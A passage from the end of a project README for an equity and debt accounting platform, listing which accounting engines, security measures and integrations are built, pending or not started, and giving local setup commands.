each with its remaining gaps spelled out in its own section above, not just implied by
omission here.) Each of these is its
own module in the same shape as the ones already built — the pattern in
`dispatch.ts` is meant to be copied, not reinvented.

**Tax election tracking (`taxElections.ts`) is now built** — ISO $100k rule, AMT
preference on ISO exercise, IRC 83(b) elections, QSBS/Section 1202 (both regimes), and
debt-side OID/market discount. One item in it needs a second look before relying on it:
the QSBS module's post-OBBBA AMT-preference treatment is sourced from law-firm/
accounting-firm alerts published shortly after the July 2025 enactment, not yet from
IRS regulations — see that section's doc comment for the specific caveat and what to
verify.

Also explicitly not started, but with a design already pinned for when it's built: an
AI module to read agreements, propose accounting classification with ASC citations for
human review/approval, and draft an audit-ready memo. That design (extraction grounded
to source text, AI proposes with an argument rather than deciding, cross-checked
against whatever deterministic classification engine exists, human approval gate
before anything commits — the same preview-then-commit shape `correctionService.ts`
already uses) is recorded in project notes, not in this repo, since it's a later phase
of work. One dependency worth flagging here: a deterministic debt/equity/mezzanine
classification engine (ASC 480 / 480-10-S99 / 815-40) needs to exist before that AI
layer has anything to cross-check its harder classification calls against — right now
that kind of deterministic check only exists for warrants (`warrantAllocation.ts`).

**Not touched at all, per the earlier "buy, don't build" decision:** the document
workflow and redlining (PandaDoc/DocuSign integration), the unified ERP integration
(Rutter/Codat/Merge), tax-agency filing integration, and investor bulk/selective email.
As of v0.19.0, `INTEGRATIONS.md` (project root) is a design document covering exactly
these — candidate vendors by category, the concrete architectural gaps (credential
storage, a background job runner, webhook receivers, a conflict-resolution model for
two-way sync) that block all of them today, and a phased rollout — but it's design and
documentation only; none of it is wired to a real vendor yet. These are vendor
integrations, not core IP — wire them up once the engine and data
model are solid, not before.

**Real authentication and authorization/multi-tenancy are now addressed** (v0.13.0 —
see "Real authentication and multi-tenancy" above): a real `User` model, signed
sessions, and per-entity `OWNER`/`EDITOR`/`VIEWER` access control via `EntityAccess`,
enforced on every entity-scoped route and page, replacing the earlier shared-password
stopgap entirely. **Still not addressed:** audit logging (who did what, when — beyond
Vercel's own request logs) and SOC 2-relevant controls generally (formal access
reviews, logging retention policy, incident response process, and the rest of a real
compliance program). Real per-user identity and access control were the harder,
more foundational half of "safe to run with real customer data"; audit logging and
formal compliance controls are the next layer, not yet started.

**Input validation on the JSON `terms` payloads is now partially addressed** (v0.12.0,
broadened in v0.17.0 — see the same section above): `src/lib/accounting/
termsValidation.ts` checks every instrument type's `terms` against the exact shape its
engine expects, at the two API routes that accept one from a client, plus a growing set
of cheap-but-high-value business-rule checks layered on top of the shape checks —
tranche quantities must sum to a stock/RSU grant's total quantity (the single most
common hand-typed-grant mistake), a tranche can't vest on or before its own grant date,
a revolver's `commitmentEnd`/`amortizationEnd` dates must be strictly after their
matching start dates, and — new in v0.17.0 — a term loan's/convertible note's
`cashFlows` and a warrant's/cash-settled SAR's `observations` arrays must be in
strictly increasing chronological order, with the first observation dated after the
instrument's own inception/grant date. That last set closes a real, previously-flagged
gap: `buildEffectiveInterestSchedule` matches `cashFlows[i]` to `periods[i]` by index
and never even looks at the `date` field, so a transposed pair of cash-flow rows used
to pass validation silently and tie the wrong payment to the wrong period with no error
at all; `buildFairValueRemeasurementSchedule`/`buildCashSettledSarSchedule` do check an
observation's date against its matching period's own end, but only once a real periods
array exists at compute time — this now catches the identical mistake immediately, at
write time, with a specific "entry N is not after entry N-1" message rather than a
generic downstream failure (or, for the effective-interest case, no failure at all).
What's still open: it's a hand-rolled stand-in for a real schema library (no npm
registry access in this sandbox — same constraint as `decimal.ts`), and business-rule
coverage remains deliberately narrow, not exhaustive, beyond what's listed above.

## Open items — the comprehensive list (as of v0.20.0)

Every gap above is explained in its own section, in context, with the reasoning behind
it. This section exists for a different purpose: one place to scan every open item at
once, organized the same way as the companion task-status spreadsheet (ask for it if
you don't have the latest copy — as of v0.20.0 it also carries a "Purpose / Why Needed"
and an "Inputs Needed From You" column for every row, not just the newest ones), so
nothing gets lost between the two. **Pending** below means real code/engine exists but
isn't fully wired end-to-end, or is blocked from execution/verification in this sandbox
specifically; **Not started** means no code exists. Each item links back to the section
with the full explanation where one exists.

**Database & schema** — Not started: running `npx prisma validate`/`migrate dev` for
real (blocked: no npm registry access here).

**Accounting engines** — **Complete as of v0.20.0**: stock option
exercise/settlement accounting (cash exercise, cashless net share settlement) and RSU
settlement accounting (net share settlement, employer withholding), plus the
employer-side tax-withholding-liability journal entries that go with both — see the
"Stock option/RSU settlement accounting" section above for the full writeup, including
what's deliberately still not modeled (ISO/NSO-specific withholding, the ASU 2016-09
maximum-statutory-rate warning); the debt modification-vs-extinguishment 10% cash flow
test (ASC 470-50-40) and the gain/loss and fee accounting that follows from it — see
the "Debt modification vs. extinguishment" section below; the beneficial
conversion feature (ASC 470-20-30) for both convertible debt and convertible preferred
— see the "Beneficial conversion feature" section below; SAFEs — ASC 480-10-25-14
classification (liability-classified by default for a standard cap/discount SAFE),
issuance, and conversion accounting — see the "SAFEs" section below; participating/convertible preferred as-converted dilution and the ASC 260-10-45
two-class EPS method (one participating class) — see the "Participating/convertible
preferred" section below; troubled debt restructuring (ASC 470-60) — the
undiscounted total-future-cash-payments modification test, the immediate-gain/
zero-further-interest path, the new-effective-rate path, and full settlement via a
transfer of assets/equity — see the "Troubled debt restructuring" section below;
ESPPs (ASC 718-50) — the ASC 718-50-25-1 noncompensatory-vs-compensatory
classification test and the look-back/discount-only grant-date fair value — see the
"ESPPs" section below; non-employee awards (ASC 718-10, post-ASU 2018-07) — the
requisite-service-period presumption, the counterparty-dependent recognition account,
and the ASC 606-10-32-27 timing floor for an award to a customer — see the
"Non-employee awards" section below; and two more pieces of the pinned
**additional ASC 718 footnote disclosures** gap (see "Reporting functionality" above
for the full 8-item list) — the award activity rollforward by count and intrinsic
value realized across a batch of exercises, both added as further exports in
`reporting.ts` rather than a new module — see the "Equity compensation footnote
disclosures, continued" section below.
Pending: the fair-value-assumptions rollup table and the vested/expected-to-vest
table (the two still-unbuilt pieces of that same footnote-disclosure gap — the
former blocked on this platform's schema not persisting per-grant valuation
assumptions, the latter a genuinely different prospective-forfeiture-rate
methodology not attempted); bifurcated convertible instruments/embedded derivatives
— the ASC 815-15-25 bifurcation CLASSIFICATION test is built (reusing
`warrantAllocation.ts`'s existing `classifyWarrant` for the ASC 815-10-15-74 scope
exception — see the "Embedded derivative bifurcation" section below), but valuing a
derivative that comes back required to bifurcate is not, since that needs a
lattice/Monte Carlo model this codebase does not build; the daily-basis accrual
engine and the
multi-tranche effective-interest engine (both built, neither wired into `dispatch.ts`'s
close workflow); the cumulative-preferred-dividend-accrual schedule (built,
deliberately not wired into the close workflow since undeclared dividends aren't a GAAP
liability); and, new in v0.20.0, revolver drawn-balance interest —
`buildCombinedRevolverSchedule` (see the section below) composes the existing
commitment-fee/deferred-fee schedules with daily-accrual interest on the drawn balance
and is fully tested, but — same "built, not wired" status as the other two Pending
items in this paragraph — isn't reachable from a real `Instrument` yet, since
`RevolverInputs`/`termsValidation.ts` would both need a new field first. The exit
waterfall calculator (v0.19.0) is complete as a standalone calculator but is Not
started as a report over real data — see the cap table item below.

**Validation & correctness** — Not started: swapping the hand-rolled validator for a
real schema library (Zod; blocked on npm registry access) and client-side/front-end
shape validation before submit (server-side `termsValidation.ts` remains the only
authoritative check).

**Auth & multi-tenancy** — Not started: password reset, multi-factor authentication,
and SOC 2-relevant controls (access reviews, log retention, incident response).
Pending: audit logging — `createdByUserId` (v0.19.0) covers who created an
`InstrumentTermVersion` or `Correction`, but nothing logs read access, login/logout, or
entity/stakeholder edits, and pre-migration rows will never have attribution.

**API & backend / front end** — Not started: running any route or page against a real
Next.js + Prisma + Postgres stack (blocked on npm registry access — everything has been
built and cross-checked by hand review, never executed), and instrument edit/delete
(a deliberate design boundary, not a gap — see the v0.18.0 section). Also Not started,
ordinary front-end polish never specifically promised elsewhere: visual design
system/branding, responsive/mobile layout, an accessibility audit, and navigation
restructuring.

**Testing & QA** — Not started: front-end component/integration tests, end-to-end
tests (Playwright/Cypress), load/performance testing, and a security review/penetration
test — all blocked in part on the same "nothing in `src/app` has ever actually run"
constraint.

**Deployment & infrastructure** — Not started: an actual production deployment, a real
`npm install`/`prisma generate` run, a CI/CD pipeline, monitoring/error tracking, and a
backup/disaster-recovery plan.

**Reporting & filings** — Not started: balance sheet/income statement generation, the
additional ASC 718 disclosures (see above), the ASC 820 fair value hierarchy
disclosure, PDF/Excel report export (only the cap table has a CSV export today),
board/investor reporting packages, 409A valuation filing export, and Form 3921/3922
generation with W-2/payroll coordination (blocked on the same ISO/NSO + grant-FMV
schema gap noted under Integrations below). Pending: presenting the two-class EPS
method as an actual financial statement disclosure line — the calculation engine
itself is Complete as of v0.20.0 (see the Accounting Engines paragraph above), but
wiring it to a real income statement's net income and share counts isn't done.
**Complete as of
v0.20.0**: the shares-issued/cash-effects/tax-withholding slice of settlement activity
in the ASC 718 disclosure package (`buildSettlementActivityDisclosure`, reachable via
`POST /api/reports/settlement`). Still Not started: the intrinsic-value-realized and
tax-benefit-recognized pieces of that same disclosure, which need a per-exercise
stock-price input nothing collects yet.

**System/filing integrations** — the full breakout lives in `INTEGRATIONS.md` and the
task-status spreadsheet; summarized here so it isn't only findable in a second file.
Not started: every actual vendor connection (Carta/Pulley/Shareworks cap table sync,
QuickBooks/Xero/NetSuite GL sync, a 409A valuation vendor feed, a public market-data
feed, tax e-filing/prep integration, payroll integration), all four architectural
prerequisites those connections need before any of them can exist at all (per-entity
encrypted credential storage, a background job runner, webhook receiver infrastructure,
a conflict-resolution model for two-way sync against this platform's append-only
history design), the terms-schema extensions integration work needs (ISO/NSO + grant
FMV on `STOCK_OPTION`, an 83(b)-filed-date field on `RESTRICTED_STOCK`, a
chart-of-accounts mapping table), rollout phases 2 and 3 (phase 1, file-based export,
is done — see above), an 83(b) election document-generator/deadline-tracker (a UI
feature, not a filing integration — the election itself is a paper mail-in), a QSBS
Form 8949/Schedule D export shape, direct state/federal securities filing
integrations, cap table data import (the reverse of the export direction, which is
built), a public API for external systems, and outbound SFTP/EDI/scheduled-export
protocols. Pending: e-signature/redlining vendor API wiring (the `Document`/
`DocumentVersion` schema is ready; no vendor API call is actually made anywhere yet).
Also Not started, added in v0.20.0 per the "e-sign every new agreement" request: vendor
selection, the actual send-for-signature API call, a status webhook synced to
`Document.status`, a workflow rule requiring signature completion before an instrument
is marked `ACTIVE`, and signed-agreement retention (whether the vendor's own storage is
the permanent record, or copies also get pulled into this platform's own storage). And,
chained off signature completion specifically: an ERP integration that auto-creates the
equity/debt entry and the matching "Other Receivable — Investor" entry the moment a
document is signed, and a cash-receipt integration that reflects the receivable as
collected — either via the same ERP, or directly off a bank feed (e.g. Plaid) as an
alternative path — all four of these chained into one event-driven workflow rather than
four disconnected features. None of this is buildable yet without the architectural
prerequisites above (specifically the webhook receiver and the background job runner)
plus a vendor/ERP choice from you.

**Security hardening** — new area in v0.20.0, added per the "fully-fledged platform"
request. **Complete as of this version**: baseline security response headers (HSTS,
CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy),
dependency vulnerability scanning (`.github/dependabot.yml`), automated static security
scanning in CI (`.github/workflows/codeql.yml`), and the free-text-field injection/XSS
review — which found and fixed a real CSV/formula-injection vulnerability in the cap
table export (see the section above) rather than turning up nothing. Not started:
Cloudflare (or equivalent) in front of the app for CDN/WAF/DDoS protection, API rate
limiting, a secrets-management practice beyond plain `.env` files, a third-party
penetration test, automated backups with point-in-time recovery, a data
retention/deletion policy, a Privacy Policy/Terms of Service and a Data Processing
Agreement template (both need actual legal counsel, not an AI-drafted document), a
SOC 2 readiness assessment, SSO/SAML for enterprise clients, API key management,
and a platform-operator role distinct from any client entity's OWNER. **Pending**:
session-security hardening (sliding idle timeout and "log out everywhere" are Complete
as of this version — see the section above — but concurrent-session limits are
deliberately deferred, needing your input on the cap and eviction policy first, so the
overall item stays Pending rather than Complete); a full CSRF audit of every mutating
route (also newly Complete as of this version — grepped for CORS headers, found none;
confirmed every mutating route uses a proper non-GET verb; combined with the session
cookie's existing `sameSite: "lax"` this closes the realistic attack surface — but it
stays Pending rather than Complete because a dedicated CSRF token, which some
compliance reviews expect regardless, isn't implemented); and confirming data-at-rest
encryption is on (Supabase defaults to this, not yet explicitly documented for this
project).

**Performance & scaling** — new area in v0.20.0. **Complete as of this version**: the
self-identified N+1 query pattern in `GET /api/reports/financial-statements` (was one
`scheduleEntry.aggregate` call per equity-comp instrument inside a loop, now one batched
`scheduleEntry.groupBy` call), pagination on list endpoints (instruments, journal
entries, stakeholders, audit trail — see above for the database-level-vs-response-level
split and why), trimming over-fetched API responses (four routes' `include` blocks
narrowed to `select`), and HTTP caching/ETag headers on the three clearest read-only
report endpoints. Not started: a read replica for reporting queries, the same
Cloudflare CDN setup as under Security hardening (double duty), Cloudflare R2/S3 for
platform-hosted file storage (only relevant if `Document` ever moves beyond a pointer
model), a Redis/Upstash caching layer for expensive computed views, and bulk/batch
export endpoints. Pending: a query performance/index audit (reviewed — the schema
already indexes every hot-path foreign key and multi-column query pattern; a further
composite index needs a real production query plan to justify, not a guess, so this
deliberately stays "not started" rather than a speculative change — see the section
above), application performance monitoring, database slow-query monitoring, uptime
monitoring, and confirming response compression is actually on in production (Vercel
defaults to this, not yet explicitly confirmed).

**Business & operations** — new area in v0.20.0, covering the "send emails from the
platform" / investor-communications / e-signature request together with billing,
support, and environment gaps. Not started: the base email-sending infrastructure
(nothing sends an email today — everything else in this list depends on this first),
making investor contact info mandatory and visible on the cap table (the `Stakeholder`
fields already exist and are optional today), the investor-communications feature
itself (select some/all investors, compose, send), an email send audit log, notification
preferences/digest emails, a Stripe (or similar) billing integration once a pricing
model is chosen, usage metering (only if pricing ends up usage-based), an in-app
support/help widget, a first-time-user onboarding flow, a staging environment separate
from production, and a zero-downtime database migration strategy.

## Getting started for real

Running it on your own machine, against your own Postgres:

```bash
npm install
cp .env.example .env   # fill in your Supabase/Postgres connection string, and set
                        # SESSION_SECRET (see the comment in .env.example for how to
                        # generate one) -- src/middleware.ts fails closed without it
npx prisma validate    # the relational design is now validated (see db/schema.sql +
                        # db/validate.sql); this step confirms Prisma agrees
npx prisma migrate dev --name init
psql "$DIRECT_URL" -f db/seed.sql   # creates the bootstrap login -- see db/seed.sql's
                                     # header comment; there's no other way to log in
npm test                # 374 tests, ~8 seconds, no database needed
npm run dev             # Next.js dev server -- visit /login, sign in as
                         # bootstrap@example.com / changeme123!, then change that
                         # password (see DEPLOYMENT.md's security note)
```

Want a real, shareable URL instead of a local dev server? **See `DEPLOYMENT.md`** —
GitHub + Supabase + Vercel, entirely through web dashboards, no local Node.js required.

## Where this fits with the rest of the project

Two other documents from this project are the context this code was built against:
the accounting test-suite scenario list (the master checklist this engine is working
through) and the competitive landscape analysis (why "debt accounted for with the same
rigor as equity, in one system" is the gap worth building into). Keep building against
the test-suite document's remaining scenarios in the same pattern as the modules here —
new engine file, hand-verified or cross-checked tests, wire into `dispatch.ts`.
